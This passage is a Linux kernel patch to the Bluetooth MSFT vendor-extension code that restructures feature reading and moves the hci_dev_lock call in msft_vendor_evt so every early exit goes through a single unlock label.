+-
+-	if (!read_supported_features(hdev, msft)) {
+-		hdev->msft_data = NULL;
+-		kfree(msft);
++	if (!read_supported_features(hdev, &supported)) {
++		hci_dev_lock(hdev);
++		kfree(msft->evt_prefix);
++		msft->evt_prefix = NULL;
++		msft->evt_prefix_len = 0;
++		msft->features = 0;
++		hci_dev_unlock(hdev);
+ 		return;
+ 	}
+ 
+-	if (msft_monitor_supported(hdev)) {
++	hci_dev_lock(hdev);
++
++	kfree(msft->evt_prefix);
++	msft->evt_prefix = supported.evt_prefix;
++	msft->evt_prefix_len = supported.evt_prefix_len;
++	msft->features = supported.features;
++
++	if (supported.features & MSFT_FEATURE_MASK_CURVE_VALIDITY)
++		hdev->msft_curve_validity = true;
++
++	hci_dev_unlock(hdev);
++
++	if (supported.features & MSFT_FEATURE_MASK_LE_ADV_MONITOR) {
+ 		msft->resuming = true;
+ 		msft_set_filter_enable(hdev, true);
+ 		/* Monitors get removed on power off, so we need to explicitly
+@@ -1067,12 +1081,15 @@ static void msft_monitor_device_evt(struct hci_dev *hdev, struct sk_buff *skb)
+ 
+ void msft_vendor_evt(struct hci_dev *hdev, void *data, struct sk_buff *skb)
+ {
+-	struct msft_data *msft = hdev->msft_data;
++	struct msft_data *msft;
+ 	u8 *evt_prefix;
+ 	u8 *evt;
+ 
++	hci_dev_lock(hdev);
++
++	msft = hdev->msft_data;
+ 	if (!msft)
+-		return;
++		goto unlock;
+ 
+ 	/* When the extension has defined an event prefix, check that it
+ 	 * matches, and otherwise just return.
+@@ -1080,23 +1097,21 @@ void msft_vendor_evt(struct hci_dev *hdev, void *data, struct sk_buff *skb)
+ 	if (msft->evt_prefix_len > 0) {
+ 		evt_prefix = msft_skb_pull(hdev, skb, 0, msft->evt_prefix_len);
+ 		if (!evt_prefix)
+-			return;
++			goto unlock;
+ 
+ 		if (memcmp(evt_prefix, msft->evt_prefix, msft->evt_prefix_len))
+-			return;
++			goto unlock;
+ 	}
+ 
+ 	/* Every event starts at least with an event code and the rest of
+ 	 * the data is variable and depends on the event code.
+ 	 */
+ 	if (skb->len < 1)
+-		return;
++		goto unlock;
+ 
+ 	evt = msft_skb_pull(hdev, skb, 0, sizeof(*evt));
+ 	if (!evt)
+-		return;
+-
+-	hci_dev_lock(hdev);
++		goto unlock;
+ 
+ 	switch (*evt) {
+ 	case MSFT_EV_LE_MONITOR_DEVICE:
+@@ -1110,6 +1125,7 @@ void msft_vendor_evt(struct hci_dev *hdev, void *data, struct sk_buff *skb)
+ 		break;
+ 	}
+ 
++unlock:
+ 	hci_dev_unlock(hdev);
+ }
+ 
 -- 
 2.53.0
